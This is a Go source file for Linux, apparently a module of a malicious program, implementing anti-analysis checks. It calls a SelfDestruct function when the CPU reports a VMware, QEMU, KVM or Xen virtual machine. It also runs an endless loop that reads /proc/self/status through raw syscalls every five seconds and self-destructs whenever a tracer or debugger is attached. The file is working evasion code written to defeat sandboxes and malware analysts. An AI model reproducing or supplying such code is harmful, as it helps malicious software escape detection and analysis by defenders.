//go:build linux

package antianalysis

import (
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/klauspost/cpuid/v2"
)

func AntiAnalysis() {
	if cpuid.CPU.VM() {
		brand := strings.ToLower(cpuid.CPU.BrandName)
		vmVendors := []string{"vmware", "qemu", "kvm", "xen"}
		for _, vendor := range vmVendors {
			if strings.Contains(brand, vendor) {
				SelfDestruct()
			}
		}
	}

	for true {
		path, _ := syscall.BytePtrFromString("/proc/self/status")
		fd, _, err := syscall.Syscall6(
			syscall.SYS_OPENAT,
			uintptr(0xffffff9c),
			uintptr(unsafe.Pointer(path)),
			uintptr(syscall.O_RDONLY),
			uintptr(0),
			0, 0,
		)

		if err == 0 {
			buffer := make([]byte, 4096)
			n, _, err2 := syscall.Syscall(
				syscall.SYS_READ,
				fd,
				uintptr(unsafe.Pointer(&buffer[0])),
				uintptr(len(buffer)),
			)
			if err2 == 0 {
				finalstring := string(buffer[:n])
				if !strings.Contains(finalstring, "TracerPid:\t0") {
					SelfDestruct()
				}
			}
		}
		syscall.Close(int(fd))

		time.Sleep(5 * time.Second)
	}
}
